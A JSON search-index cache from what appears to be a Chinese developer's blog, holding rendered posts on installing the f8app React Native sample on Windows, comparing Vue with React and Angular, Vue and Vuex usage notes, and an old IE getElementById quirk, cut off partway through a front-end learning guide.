{"total":40,"cache":[{"filePath":"post\\2017\\11\\21-f8app-guide.md","htmlPath":"/post/2017/11/21-f8app-guide.html","name":"21-f8app-guide.md","type":"md","layout":"post","title":"f8app在window安装教程","date":"2017/11/21","categories":"Experience","tags":"专题探究","html":"<p>md写图片还要上传图床，太懒了</p>\n<p><a href=\"http://blog.csdn.net/lry1994/article/details/78589019\">http://blog.csdn.net/lry1994/article/details/78589019</a></p>\n<p>这货，花了我好几天时间\nIDE：androidStudio,可以按照提示修改错误</p>\n<pre><code>1、建立一个空的文件夹！！！这一步很重要\n2、$ git clone https://github.com/fbsamples/f8app.git\n3、$ cd f8app\n4、$ npm install\n这一步我出现了好多不知所措的错误，然后神奇的是，多装几次就好了！！！</code></pre><p>5、运行<code>mongod --dbpath &quot;W://MongoDB//data&quot;</code>\n    <a href=\"https://github.com/ReactWindows/f8app/blob/data/mongodb/db.zip\">https://github.com/ReactWindows/f8app/blob/data/mongodb/db.zip</a></p>\n<pre><code>把db.zip解压后的文件拷贝到W://MongoDB//data下\n\nmongod --dbpath &quot;W://MongoDB//data&quot;\n打开mongodb确保运行起来:https://www.cnblogs.com/Joans/p/3706406.html</code></pre><p>6、启动 Parse/GraphQL servers</p>\n<pre><code>$ npm start\nnpm run import-data 这条命令运行会百分百报错SyntaxError:Unexpected token P in JSON at position 0 ，所以不要这个命令了。什么去除https证书验证、代理都没有，因为那个请求链接已经关闭</code></pre><p>   参考链接<a href=\"http://blog.csdn.net/industriously/article/details/73302207\">http://blog.csdn.net/industriously/article/details/73302207</a></p>\n<p>7、确认下面的地址是可以访问的，并且是有数据的。\n<a href=\"http://localhost:8080/dashboard\">http://localhost:8080/dashboard</a></p>\n<p><a href=\"http://localhost:8080/graphql\">http://localhost:8080/graphql</a>\n打开<a href=\"http://localhost:8080/graphql\">http://localhost:8080/graphql</a></p>\n<p>输入</p>\n<pre><code>``\nquery{\n\nschedule{\n\ntitle\n\nspeakers{\n\n    name\n\n    title\n\n    }\n\nlocation{\n\n    name\n\n    }\n\n}\n\n}\n``</code></pre><p>运行有结果</p>\n<p>8、react-native start  这句必须有</p>\n<p>9、react-native run-android</p>\n<pre><code>Exception in thread &quot;main&quot;java.lang.RuntimeException: Timeout of 120000 reached waiting for exclusiveaccess to file:/Users/weidingqiang/.gradle/wrapper/dists/gradle-2.4-all/3i2gobhdl0fm2tosnn15g540i0/gradle-2.4-all.zip\n\nat org.gradle.wrapper.ExclusiveFileAccessManager.access(ExclusiveFileAccessManager.java:61)\n\nat org.gradle.wrapper.Install.createDist(Install.java:47)\n\nat org.gradle.wrapper.WrapperExecutor.execute(WrapperExecutor.java:129)\n\nat org.gradle.wrapper.GradleWrapperMain.main(GradleWrapperMain.java:48)</code></pre><p>解决方法</p>\n<p>[下载链接](<a href=\"https://services.gradle.org/distributions/\">https://services.gradle.org/distributions/</a> 下载链接)</p>\n<p>1.重新下载gradle-3.3-all.zip，进入一堆乱码的文件夹，比如2n0i7hqatcbtk57vvql575dbap</p>\n<p>2.不要删除里面的.lck和.part等文件，直接拷贝下载的gra</p>\n<p>dle-3.3-all.zip文件到该目录</p>\n<p>在androidstudio运行，按照他的suggestion改就OK了</p>\n<p>接下来出现的都是版本问题，我也不知道怎么改了，改了好多次，最后可以了</p>\n<p>最后成功运行！！！！！</p>\n<p>运行方式\nreact-native  init 项目名</p>\n<p>reactNative利用androidStudio运行：</p>\n<p>在androidStudio 打开android文件夹，一定要打开这个，不然不能正常运行</p>\n<p>在项目目录下运行react-native start 启动package server,</p>\n<p>在androidstudio点击run-&gt;app</p>\n<p>adb shell input keyevent 82 打开菜单</p>\n<p>或者</p>\n<p>reactNative真机运行：USB手机连接电脑，</p>\n<p>在项目目录下运行react-native run-android</p>\n<p>摇晃设备或按Menu键可以打开调试菜单，点击Dev Settings，</p>\n<p>选Debug server host for device，</p>\n<p>输入你的正在运行packager的那台电脑的局域网IP加:8081（同时要保证手机和电脑在同一网段，且没有防火墙阻拦），再按back键返回，</p>\n<p>再按Menu键，在调试菜单中选择Reload JS，就应该可以看到运行的结果了。</p>\n<p>adb devices查看连接电脑的手机设备</p>\n<p>creact-react-native-app 项目名这种方法是创建纯粹的react-native，没有和安卓混合开发</p>\n<p>真机运行react-native遇到了的问题</p>\n<p>1、adbserver version (32) doesn&#39;t match this client (36); killing...</p>\n<p>最后原因是因为手机驱动安装失败</p>\n<p>解决方法：豌豆荚</p>\n<p>2、</p>\n<p>解决方法</p>\n<p>3、</p>\n<p>解决方法：修改两个地方</p>\n<p><a href=\"http://blog.csdn.net/mapboo/article/details/53419838\">http://blog.csdn.net/mapboo/article/details/53419838</a></p>\n<p>其他：</p>\n<p>构建 F8 App / ReactNative 开发指南</p>\n<p><a href=\"https://f8-app.liaohuqiu.net/\">https://f8-app.liaohuqiu.net/</a></p>\n<p>F8App-ReactNative项目源码分析4-js篇</p>\n<p><a href=\"http://blog.csdn.net/offbye/article/details/51586227\">http://blog.csdn.net/offbye/article/details/51586227</a></p>\n","index":0},{"filePath":"post\\2017\\12\\28-vue-comparison.md","htmlPath":"/post/2017/12/28-vue-comparison.html","name":"28-vue-comparison.md","type":"md","layout":"post","title":"vue vs react vs angular1","date":"2017/12/28","categories":"Experience","tags":"专题探究","html":"<h1 id=\"vue-与angualr1-react-不同体验整理\">vue 与angualr1 ,react 不同体验整理</h1>\n<p>之前项目组的前端用的是angualr1.x版本，给我的感觉就是angular啥都有，只要注入依赖就可以用。</p>\n<p>工作闲暇之余会自己学习新知识，react很火，但是公司没有react的项目实操，所以自己找了网上一个比较适合入门的项目来练手，下面是我在边敲边学的过程中体验到的不同点。</p>\n<p>而react和vue就是轻量级的，要什么就去找，找来再用。</p>\n<ul>\n<li><a href=\"#React%E4%B8%8Evue%E6%AF%94%E8%BE%83\">React与vue比较</a><ul>\n<li><a href=\"#%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F\">生命周期</a></li>\n<li><a href=\"#%E6%80%BB%E7%BB%93\">总结</a></li>\n</ul>\n</li>\n<li><a href=\"#React-redux%E4%B8%8Evuex%E6%AF%94%E8%BE%83\">React-redux与vuex比较</a><ul>\n<li><a href=\"#1-%E4%BD%BF%E7%94%A8%E6%B5%81%E7%A8%8B\">1-使用流程</a></li>\n<li><a href=\"#2-%E5%85%B1%E4%BA%AB%E6%95%B0%E6%8D%AEstore\">2-共享数据store</a></li>\n<li><a href=\"#3-%E6%A8%A1%E5%9D%97\">3-模块</a></li>\n<li><a href=\"#4-%E5%94%AF%E4%B8%80%E5%8F%AF%E4%BB%A5%E6%94%B9%E5%8F%98state%E7%9A%84%E6%96%B9%E5%BC%8F\">4-唯一可以改变state的方式</a></li>\n<li><a href=\"#5-%E7%BB%84%E4%BB%B6%E8%BF%9E%E6%8E%A5%E5%A7%BF%E5%8A%BF\">5-组件连接姿势</a></li>\n<li><a href=\"#6-%E8%B0%83%E7%94%A8%E9%93%BE\">6-调用链</a></li>\n<li><a href=\"#7-%E6%80%BB%E7%BB%93\">7-总结</a></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"react与vue比较\">React与vue比较</h1>\n<h3 id=\"生命周期\">生命周期</h3>\n<h4 id=\"react生命周期\">React生命周期</h4>\n<p>{% asset_img react-life.png react生命周期 %}</p>\n<h4 id=\"vue生命周期\">vue生命周期</h4>\n<p>{% asset_img vue-life.png vue生命周期 %}</p>\n<h3 id=\"总结\">总结</h3>\n<h4 id=\"react\">React</h4>\n<ol>\n<li>子组件直接import后使用</li>\n<li>在render()的return里面进行模板渲染</li>\n<li>实例的方法在constructor里面定义</li>\n<li>实例的数据在constructor里面定义</li>\n<li>contextTypes验证数据类型</li>\n<li>defaultProps设置默认值</li>\n<li>父组件传给子组件的数据，在子组件内用this.props.xxx获取</li>\n</ol>\n<h4 id=\"vue\">Vue</h4>\n<ol>\n<li>子组件import后，还需在实例里面的components注册</li>\n<li>直接在实例的template属性或标签渲染模板</li>\n<li>实例的方法写在method里面</li>\n<li>实例的数据写在data,computed里面</li>\n<li>props验证数据类型</li>\n<li>props里面的default设置默认值</li>\n<li>父组件传给子组件的数据在props里面注册，在子组件内用this.xxx获取。这一点有点像angular的隔离scope\n(react没有的)</li>\n<li>computed可以依赖于data更新而更新</li>\n<li>有watch监听函数</li>\n</ol>\n<h4 id=\"觉得与angular类似地方\">觉得与angular类似地方</h4>\n<ol>\n<li>双向绑定，v-指令和angular的ng-指令类似</li>\n<li>同样有watch监听函数</li>\n<li>vue父组件传给子组件的数据要在props里面注册，在子组件内用this.xxx获取。这一点有点像angular的隔离scope</li>\n</ol>\n<p>觉得vue比起angular更像react。vue和react很像，但是比react细腻。</p>\n<h1 id=\"react-redux与vuex比较\">React-redux与vuex比较</h1>\n<h3 id=\"1-使用流程\">1-使用流程</h3>\n<h4 id=\"react-redux\">React-redux</h4>\n<ol>\n<li>写reducer（previousState,action）函数 return 更新后的所需要的数据</li>\n<li>Store=createStore(reducer)</li>\n<li><Provider store={store}>{router}&lt; Provider/&gt;</li>\n<li>定义action对象，{事件类型type,事件参数data}</li>\n<li>connect(mapStateToProps, mapDispatchToProps)（组件）</li>\n<li>组件里面使用this.props.（action.type）(action.data)</li>\n</ol>\n<p>{% asset_img react-redux-process.png react-redux使用流程 %}</p>\n<h4 id=\"vuex\">vuex</h4>\n<ol>\n<li>写好store和不同模块的state,mutations,getters,actions </li>\n<li>store = new Vuex.Store( )</li>\n<li>new Vue({\nel: &#39;#app&#39;,\nstore,\nrender: h =&gt; h(App)\n})</li>\n<li>组件使用</li>\n</ol>\n<p>mapState</p>\n<p>mapMutations</p>\n<p>mapGetters</p>\n<p>mapActions</p>\n<p>连接</p>\n<h3 id=\"2-共享数据store\">2-共享数据store</h3>\n<h4 id=\"react-redux的store\">React-redux的store</h4>\n<pre><code class=\"language-javascript\">const store = createStore(\n    combineReducers(reducer),\n\n);\n\nReactDOM.render(\n&lt;Provider store={store}&gt;\n  {router}\n&lt;/Provider&gt;,\ndocument.getElementById(&#39;app&#39;)\n);\n</code></pre>\n<h4 id=\"vuex的store\">Vuex的store</h4>\n<pre><code class=\"language-javascript\">store = new Vuex.Store({\n  state:\nmutations\nactions\ngetters\n  modules:}）\n\nnew Vue({\n  el: &#39;#app&#39;,\n  router,\n  store,\n  render: h =&gt; h(App)\n})</code></pre>\n<h3 id=\"3-模块\">3-模块</h3>\n<h4 id=\"react-redux的reducer\">React-redux的reducer</h4>\n<p>reducer和vuex的modules类似，可以用来划分不同模块</p>\n<pre><code class=\"language-javascript\">// reducer\nfunction User (state = JSON.parse(Tool.localItem(&#39;User&#39;)), action) {     \n        switch (action.type) {\n            case SIGNIN_SUCCESS: //登录成功                               \n                Tool.localItem(&#39;User&#39;, JSON.stringify(action.target));               \n                return action.target;\n\n            case SIGNIN: //退出\n                Tool.removeLocalItem(&#39;User&#39;);\n                return null;\n\n            default:            \n               return state;\n        }\n\n    }\n/**省略。。。。。。*/\nexport default { IndexList, Topic, MyMessages, UserView, User }\n</code></pre>\n<h4 id=\"vuex的modules\">vuex的modules</h4>\n<pre><code class=\"language-javascript\">export default new Vuex.Store({\n  state: {\n    user: null\n  },\n  mutations: {\n    setUser (state, payload) {\n      state.user = payload     \n    }\n  },\n  actions,\n  getters,\n  modules: {\n    cart,\n    products,\n    login}\n})</code></pre>\n<h3 id=\"4-唯一可以改变state的方式\">4-唯一可以改变state的方式</h3>\n<h4 id=\"react-redux的action\">React-redux的action</h4>\n<p>action就是一个对象,具体处理方法在reducer里面实现</p>\n<pre><code class=\"language-javascript\">export function signinSuccess(target){\nreturn {\ntype:&#39;signinSuccess&#39;,\ntarget\n}\n};</code></pre>\n<h4 id=\"vuex的mutation\">Vuex的mutation</h4>\n<p>mutation是方法，由action调用</p>\n<pre><code class=\"language-javascript\">// mutations\nconst mutations = {\n  [types.RECEIVE_PRODUCTS] (state, { products }) {\n    state.all = products\n  },\n\n  [types.ADD_TO_CART] (state, { id }) {\n    console.log(&#39;form product&#39;)\n    state.all.find(p =&gt; p.id === id).inventory--\n  }\n}</code></pre>\n<h3 id=\"5-组件连接姿势\">5-组件连接姿势</h3>\n<h4 id=\"react-redux连接\">React-redux连接</h4>\n<p>用connect方法</p>\n<pre><code class=\"language-javascript\">const mapStateToProps = (state) =&gt; {\n    return {\n      User: state.User\n    }\n  }\n\n  const mapDispatchToProps = (dispatch) =&gt; {\n    return {\n        signinSuccess: (user) =&gt; {\n            dispatch(signinSuccess(user))\n        }\n    }\n  }\n\nexport default connect(mapStateToProps,mapDispatchToProps)(SignIn);</code></pre>\n<h4 id=\"vuex连接\">Vuex连接</h4>\n<p>只需要在组件里面映射\nmapState<br>mapMutations<br>mapGetters<br>mapActions</p>\n<pre><code class=\"language-javascript\">export default {\n  computed: mapGetters({\n    products: &#39;allProducts&#39;\n  }),\n  methods: mapActions([\n    &#39;addToCart&#39;\n  ]),</code></pre>\n<h3 id=\"6-调用链\">6-调用链</h3>\n<h4 id=\"react-redux调用链\">React-redux调用链</h4>\n<p>{% asset_img react-redux-lian.png React-redux调用链 %}</p>\n<h4 id=\"vuex调用链\">Vuex调用链</h4>\n<p>{% asset_img vuex-lian.png vuex调用链 %}</p>\n<h3 id=\"7-总结\">7-总结</h3>\n<h4 id=\"react-redux-1\">React-redux</h4>\n<p>action是唯一修改state的方法</p>\n<p>Action用dispatch调用</p>\n<p>reducer， 和vuex的modules相似</p>\n<p>组件调用都是dispatch action</p>\n<h4 id=\"vuex-1\">Vuex</h4>\n<p>mutation是唯一修改state的方法，类似React-redux的action</p>\n<p>除了mutation还有action,</p>\n<p>mutation用于同步操作，用commit调用</p>\n<p>action用于异步操作,用dispatch调用</p>\n<p>Modules，和redux的reducer相似</p>\n<p>有getters</p>\n<p>有namespaced</p>\n<p>组件调用都是dispatch action</p>\n","index":1},{"filePath":"post\\2017\\12\\6-vue-attention.md","htmlPath":"/post/2017/12/6-vue-attention.html","name":"6-vue-attention.md","type":"md","layout":"post","title":"vue 一些需要注意的点","date":"2017/12/6","categories":"Experience","tags":"专题探究","html":"<h2 id=\"技术栈\">技术栈</h2>\n<ul>\n<li><a href=\"http://www.2ality.com/2015/08/getting-started-es6.html\">ES6 Javascript</a></li>\n<li><a href=\"http://vuejs.org\">Vue JS</a> 框架和 <a href=\"http://npmjs.org\">NPM</a> 生态</li>\n<li><a href=\"http://router.vuejs.org/\">Vue Router</a></li>\n<li><a href=\"https://vuex.vuejs.org/zh-cn/intro.html\">Vuex</a></li>\n<li><a href=\"https://vue-loader.vuejs.org/zh-cn/\">.vue files</a></li>\n<li><a href=\"https://github.com/vuejs/vue-cli\">vue-cli</a></li>\n<li><a href=\"https://github.com/axios/axios\">Axios</a></li>\n<li><a href=\"http://element.eleme.io/#/zh-CN/component\">Element-ui</a></li>\n<li><a href=\"https://webpack.js.org/\">Webpack</a></li>\n<li><a href=\"https://eslint.org/\">ESLint</a></li>\n</ul>\n<h2 id=\"摘抄\">摘抄</h2>\n<p>不要为了编辑内容而打开另一个页面，应该直接在上下文中实现编辑。\n能在这个页面解决的问题，就不要去其它页面解决，因为任何页面刷新和跳转都会引起变化盲视（Change Blindness），导致用户心流（Flow）被打断</p>\n<p>『格式塔学派』中的连续律（Law of Continuity）所描述的，在知觉过程中人们往往倾向于使知觉对象的直线继续成为直线，使曲线继续成为曲线。在界面设计中，将元素进行对齐，既符合用户的认知特性，也能引导视觉流向，让用户更流畅地接收信息。</p>\n<p>冒号对齐（右对齐）能让内容锁定在一定范围内，让用户眼球顺着冒号的视觉流，就能找到所有填写项，从而提高填写效率。为了快速对比数值大小，建议所有数值取相同有效位数，并且右对齐。</p>\n<p>在一些需要用户慎重决策的场景中，系统应该保持中立，不能替用户或者诱导用户做出判断。</p>\n<p>单字段行内编辑，当『易读性』远比『易编辑性』重要时，可以使用『单击编辑』。</p>\n<p>当『易读性』为主，同时又要突出操作行的『易编辑性』时，可使用『文字链/图标编辑』。</p>\n<p>当需要增强按钮的响应性时，可以通过增加用户点击热区的范围，而不是增大按钮形状，从而增强响应性，又不缺失美感。</p>\n<p>颜需色遵守 WCAG 2.0 的标准，操作类的色彩搭配都应满足颜色对比值 3:1 的最低标准。文本和背景色之间至少保持最小 4.5:1 的对比度（AA 级），正文内容都保持了 7:1 以上的 AAA 级对比度。</p>\n<p>在操作前引导告知用户操作的目的或重要性，能促进用户更愿意去执行。</p>\n<p>当用户填写的内容出错的时候，你的报错信息应当符合用户的认知，用易于理解的方式表述出来。</p>\n<p>直接使用『你』、『我』来和用户对话，与用户建立亲密感。避免使用『您』，让用户感觉太过疏远。</p>\n<p>不要在同一个句式中混用『你』和『我』，交互中指代混乱会让用户相当纠结。</p>\n<h2 id=\"ｖｕｅ\">ｖｕｅ</h2>\n<ul>\n<li>不要在选项属性或回调上使用箭头函数</li>\n<li>计算属性是基于它们的依赖进行缓存的。计算属性只有在它的相关依赖发生改变时才会重新求值。</li>\n<li>当 v-bind:style 使用需要添加浏览器引擎前缀的 CSS 属性时，如 transform，Vue.js 会自动侦测并添加相应的前缀。</li>\n<li>表单元素不要复用它们，只需添加一个具有唯一值的 key 属性即可</li>\n<li>v-show 不支持 <code>&lt;template&gt;</code>元素， v-else也不支持</li>\n<li>v-for 具有比 v-if 更高的优先级。\n它能跟踪每个节点的身份，从而重用和重新排序现有元素，你需要为每项提供一个唯一 key 属性。</li>\n</ul>\n<pre><code class=\"language-html\">&lt;div v-for=&quot;item in items&quot; :key=&quot;item.id&quot;&gt;\n  &lt;!-- 内容 --&gt;\n&lt;/div&gt;</code></pre>\n<ul>\n<li><p>建议尽可能在使用 v-for 时提供 key，除非遍历输出的 DOM 内容非常简单，或者是刻意依赖默认行为以获取性能上的提升。</p>\n<p>2.2.0+ 的版本里，当在组件中使用 v-for 时，key 现在是必须的。</p>\n</li>\n<li><p>vue数组的变异方法，：push()pop()shift()unshift()splice()sort()reverse()\n  非变异 (non-mutating method) 方法，例如：filter(), concat() 和 slice()</p>\n</li>\n<li><p>Vue 不能检测以下变动的数组：</p>\n<ol>\n<li><p>当你利用索引直接设置一个项时，例如：<code>vm.items[indexOfItem] = newValue</code>\n解决方法</p>\n<p><code>javascript\n// Vue.set\nVue.set(example1.items, indexOfItem, newValue)\n或者\n// Array.prototype.splice\nexample1.items.splice(indexOfItem, 1, newValue)</code></p>\n</li>\n<li><p>当你修改数组的长度时，例如：<code>vm.items.length = newLength</code>\n解决方法</p>\n<p><code>example1.items.splice(newLength)</code></p>\n</li>\n</ol>\n<ul>\n<li><p>对于已经创建的实例，Vue 不能动态添加根级别的响应式属性。但是，可以使用 \n<code>Vue.set(object, key, value)</code>方法向嵌套对象添加响应式属性。\n还可以使用<code>this.$set</code>实例方法，或者</p>\n<p><code>javascript\nthis.userProfile = Object.assign({}, this.userProfile, {\nage: 27,\nfavoriteColor: &#39;Vue Green&#39;\n})</code></p>\n</li>\n</ul>\n</li>\n<li><p>事件修饰符。</p>\n<p>.stop .prevent. capture .self .once .native</p>\n<p><code>@click.prevent.self</code>会阻止所有的点击，而\n<code>@click.self.prevent</code> 只会阻止对元素自身的点击。</p>\n</li>\n</ul>\n<ul>\n<li><p>构造 Vue 实例时传入的各种选项大多数都可以在组件里使用。只有一个例外：data 必须是函数。</p>\n</li>\n<li><p>Vue 实例指的是 new Vue</p>\n<p>组件指的是 Vue.component,或者new Vue里面的component</p>\n</li>\n<li><p>组件实例的作用域是孤立的</p>\n</li>\n<li><p>当使用的不是字符串模板时，camelCase (驼峰式命名) 的 prop 需要转换为相对应的 kebab-case (短横线分隔式命名)</p>\n</li>\n<li><p>初学者常犯的一个错误是使用字面量语法传递数值：</p>\n<pre><code class=\"language-html\">&lt;!-- 传递了一个字符串 &quot;1&quot; --&gt;\n&lt;comp some-prop=&quot;1&quot;&gt;&lt;/comp&gt;</code></pre>\n<p>因为它是一个字面量 prop，它的值是字符串 &quot;1&quot; 而不是一个数值。</p>\n<p>如果想传递一个真正的 JavaScript 数值，则需要使用 v-bind，从而让它的值被当作 JavaScript 表达式计算：</p>\n<pre><code class=\"language-html\">&lt;!-- 传递真正的数值 --&gt;\n&lt;comp v-bind:some-prop=&quot;1&quot;&gt;&lt;/comp&gt;</code></pre>\n</li>\n<li><p>每次父组件更新时，子组件的所有 prop 都会更新为最新值。这意味着你不应该在子组件内部改变 prop。注意在 JavaScript 中对象和数组是    引用类型，指向同一个内存空间，</p>\n<p>  如果 prop 是一个对象或数组，在子组件内部改变它会影响父组件的状态。</p>\n</li>\n<li><p>.sync 修饰符对一个 prop 进行“双向绑定”.默认Prop是单向绑定的。</p>\n<p>从 2.3.0 起我们重新引入了 .sync 修饰符，但是这次它只是作为一个编译时的语法糖存在。它会被扩展为一个自动更新父组件属性的 v-on 监听器。\n如下代码\n<code>&lt;comp :foo.sync=&quot;bar&quot;&gt;&lt;/comp&gt;</code>\n会被扩展为：\n<code>&lt;comp :foo=&quot;bar&quot; @update:foo=&quot;val =&gt; bar = val&quot;&gt;&lt;/comp&gt;</code>\n当子组件需要更新 foo 的值时，它需要显式地触发一个更新事件：\n<code>this.$emit(&#39;update:foo&#39;, newValue)</code></p>\n</li>\n</ul>\n<h2 id=\"vuex\">Vuex</h2>\n<p>  Vuex 的 store 中的状态是响应式的，那么当我们变更状态时，监视状态的 Vue 组件也会自动更新。这也意味着 Vuex 中的 mutation 也需要与使用 Vue 一样遵守一些注意事项：</p>\n<ol>\n<li><p>最好提前在你的 store 中初始化好所有所需属性。</p>\n</li>\n<li><p>当需要在对象上添加新属性时，你应该使用</p>\n<p><code>Vue.set(obj, &#39;newProp&#39;, 123)</code>, </p>\n<p>或者以新对象替换老对象。例如，利用 stage-3 的对象展开运算符我们可以这样写：</p>\n<p><code>state.obj = { ...state.obj, newProp: 123 }</code></p>\n<p>mutation 必须是同步函数</p>\n<p>store.dispatch 可以处理被触发的 action 的处理函数返回的 Promise，并且 store.dispatch 仍旧返回 Promise</p>\n<p>在 Vuex 模块化中，state 是唯一会根据组合时模块的别名来添加层级的，后面的 getters、mutations 以及 actions 都是直接合并在 store 下。</p>\n<p><code>getter({state,getters,rootState})</code>由于 getters 不区分模块，所以不同模块中的 getters 如果重名，Vuex 会报出<code>&#39;duplicate getter key: [重复的getter名]&#39;</code> 错误。</p>\n<p><code>mutations(state)</code> mutation 的回调函数中只接收唯一的参数——当前模块的 state。mutations 与 getters 类似，不同模块的 mutation 均可以通过 <code>store.commit</code> 直接触发。</p>\n<p><code>action({state,rootState, getters, mutations, actions})</code>与 mutations 类似，不同模块的 actions 均可以通过 <code>store.dispatch</code> 直接触发.</p>\n<p>在 action 中可以通过 context.commit 跨模块调用 mutation，同时一个模块的 action 也可以调用其他模块的 action</p>\n<p>同样的，当不同模块中有同名 action 时，通过 store.dispatch 调用，会依次触发所有同名 actions。</p>\n</li>\n</ol>\n<h2 id=\"ｂａｂｅｌ\">ｂａｂｅｌ</h2>\n<p>transform-runtime最大的作用主要有几下几点：</p>\n<ol>\n<li><p>解决编译中产生的重复的工具函数，减小代码体积</p>\n</li>\n<li><p>只支持新的Javascript语法扩展，比如<code>Set</code>，<code>Map</code>...不支持\n <code>Object.assign，&quot;foobar&quot;.includes(&quot;foo&quot;)</code>\n 这些对于API的扩展，所以需要使用这些新的API功能需要引入<code>babel-polyfill</code></p>\n<p> <code>&quot;presets&quot;: [&quot;env&quot;]</code> 表示<code>babel-preset-env</code></p>\n<p> 每年每个 preset 只编译当年批准的内容。 而 babel-preset-env 相当于 es2015 ，es2016 ，es2017 及最新版本。</p>\n</li>\n</ol>\n<h2 id=\"ｖｕｅ－ｌｏａｄｅｒ\">ｖｕｅ－ｌｏａｄｅｒ</h2>\n<p>  使用 scoped 后，父组件的样式将不会渗透到子组件中。</p>\n<p>  通过 v-html 创建的 DOM 内容不受作用域内的样式影响，但是你仍然可以通过深度作用选择器来为他们设置样式</p>\n<p>  <code>sass-resources-loader</code>:在每个组件里加载一个设置文件，而无需每次都将其显式导入 </p>\n<p>  Vue 组件中的所有 JavaScript 默认使用 <code>babel-loader</code>处理</p>\n<p>  <code>file-loader</code> 可以指定要复制和放置资源文件的位置，以及如何使用版本哈希命名以获得更好的缓存此外，这意味着 你可以就近管理图片文件，可以使用相对路径而不用担心布署时URL问题。使用正确的配置，Webpack 将会在打包输出中自动重写文件路径为正确的URL。</p>\n<p>  <code>url-loader</code> 允许你有条件将文件转换为内联的 <code>base-64 URL</code> (当文件小于给定的阈值)，这会减少小文件的 HTTP 请求。如果文件大于该阈值，会自动的交给 file-loader 处理。</p>\n<p>  对于 css, 由<code>vue-style-loader</code> 返回的结果通常不太有用。使用 <code>postcss</code>插件将会是更好的选择。</p>\n<p>  <code>extract-text-webpack-plugin</code>:Extract text from a bundle, or bundles, into a separate file.</p>\n<pre><code>  ``javascript\n  loader: &#39;vue-loader&#39;,\n          options: {\n            extractCSS: true\n          }\n  ``</code></pre><p><code>HtmlWebpackPlugin</code>： 使得webpack入口点生成的文件都会在生成的HTML文件中的script标签内。\n<code>ExtractTextPlugin</code>提取CSS，然后包含在HTML head中的link标签内。</p>\n<h2 id=\"完整的导航解析流程-vue-router\">完整的导航解析流程 vue-router</h2>\n<ol>\n<li>导航被触发。</li>\n<li>在失活的组件里调用beforeRouteLeave 。</li>\n<li>调用全局的 beforeEach 守卫。</li>\n<li>在重用的组件里调用 beforeRouteUpdate 守卫 (2.2+)。</li>\n<li>在路由配置里调用 beforeEnter。</li>\n<li>解析异步路由组件。</li>\n<li>在被激活的组件里调用 beforeRouteEnter。</li>\n<li>调用全局的 beforeResolve 守卫 (2.5+)。</li>\n<li>导航被确认。</li>\n<li>调用全局的 afterEach 钩子。</li>\n<li>触发 DOM 更新。</li>\n<li>用创建好的实例调用 beforeRouteEnter 守卫中传给 next 的回调函数。</li>\n</ol>\n","index":2},{"filePath":"post\\2017\\2017.md","htmlPath":"/post/2017/2017.html","name":"2017.md","type":"md","title":"2017遇到的问题","date":"2017/12/1","categories":"Experience","tags":"日常记录","html":"<h3 id=\"documentgetelementbyidelementname\">document.getElementById(elementName)</h3>\n<p> 昨晚在公司的OA系统提交账务报销的时候，发现保存老是保存不了，看了控制台，console出现了错误，OA是以前的老系统，用原生的js写的。具体原因是 document.getElementById(xx)取不到值。（我的OA只能用IE打开==）</p>\n<pre><code>然后去检查元素看了一下，发现并没有id==xx的元素，都是写成name=xx,当时我理所应当地以为是OA有bug,手动在name=xx的后面加上id=xx,再点击保存就OK了。\n\n今天查了一下，原来不是有bug。\n\n&gt;在 IE6 IE7 IE8(Q) 中，支持以 document.getElementById(elementName) 的方式获取 A APPLET BUTTON FORM IFRAME IMG INPUT MAP OBJECT EMBED SELECT TEXTAREA 元素，而其他浏览器的任何元素均不支持该方式。\n\n\n参考\n\n[SD9001: IE6 IE7 IE8(Q) 中的 getElementById 方法能以 name 属性为参数获取某些元素](http://www.w3help.org/zh-cn/causes/SD9001)\n\n实验了一下，用IE8版本，成功了吼吼吼</code></pre><h3 id=\"polyfill\">Polyfill</h3>\n<p> <code>Polyfill</code>的准确意思为：用于实现浏览器并不支持的原生API的代码。\n    例如，querySelectorAll是很多现代浏览器都支持的原生Web API，但是有些古老的浏览器并不支持，那么假设有人写了库，只要用了这个库， 你就可以在古老的浏览器里面使用<code>document.querySelectorAll</code>，使用方法跟现代浏览器原生API无异。那么这个库就可以称为<code>Polyfill</code>或者<code>Polyfiller</code>。\n    好，那么问题就来了。jQuery是不是一个Polyfill?答案是No。因为它并不是实现一些标准的原生API，而是封装了自己API。一个Polyfill是抹平新老浏览器 标准原生API 之间的差距的一种封装，而不是实现自己的API。</p>\n","index":3},{"filePath":"post\\2017\\7\\1-start-front-end.md","htmlPath":"/post/2017/7/1-start-front-end.html","name":"1-start-front-end.md","type":"md","layout":"post","title":"前端启航","date":"2017/7/1","categories":"Collecting","tags":"专题探究","html":"<p>以前开始学前端就是看了这份同学转给我的文档，还是有点指导性质的</p>\n<ol>\n<li>{ 网站前端 }\n如果你有耐心坚持个一年以上的话, 我会推荐HTML, css ,js, apache ,php, mysql</li>\n</ol>\n<p>后三者是需要装软件的, 推荐wamp, 绝佳的一站式环境配置, WampServer, the web development platform on Windows 直接包括了apache, php, mysql三个软件, 省的自己一个一个装.\n有不少人在评论里问mac os下对应的软件, 这里补充一下: XAMPP Installers and Downloads for Apache Friends</p>\n<ol>\n<li>首先学习HTML, css, 这两个东西是一套的, 非常容易理解, 把w3school上面的教程过一遍就会了, 记住要一个个过, 千万不要偷懒, 一旦开始偷懒, 你会越来越偷懒, 最后什么都没学成. HTML 教程 , CSS 教程</li>\n<li>下一步是学js, js相比前两个会难的多, 因为js才是一门正式的编程语言, 同样, w3school的教程全过一遍, JavaScript 教程 , 教程过完了就可以买书看了, 强烈推荐一本超好入门书: 《JavaScript DOM编程艺术（第2版）》(Jeremy Keith，Jeffrey Sambells)【摘要 书评 试读】 , 认真学, 多看, 看完之后学jquery, 这个时候你基本能够了解语言库了, jquery 也直接过一遍w3school的教程,jQuery 教程 . jquery会了, 基本上你网页开发前端就已经入门了, 如果你学的扎实, 反复的看, 其实你就可以胜任前端开发的工作了, 不过浏览器兼容性还是解决不了的, 不过你目标不是前端工程师, 浏览器的兼容性不了解也无所谓.</li>\n<li>在第二步你学习js的时候, 你可能就接触一些后端的东西, 没错, 就是ajax. 这个是需要后端返回数据的. 这个时候你要开始学习php了, 入门php相比于js会更麻烦一些, 因为运行php需要有很多细节要处理, 所以一本好的入门书籍是非常重要的, 这个w3school上面的php帮不了什么忙了, 推荐一本书: 《php和mysql web开发（原书第4版）》([澳]威利，[澳]汤姆森)【摘要 书评 试读】 , 当然, 这过程中你会遇到各种各样的问题, 但是如果你学到了这一步, 非常欢迎你私信我来学习, 我绝对帮助, 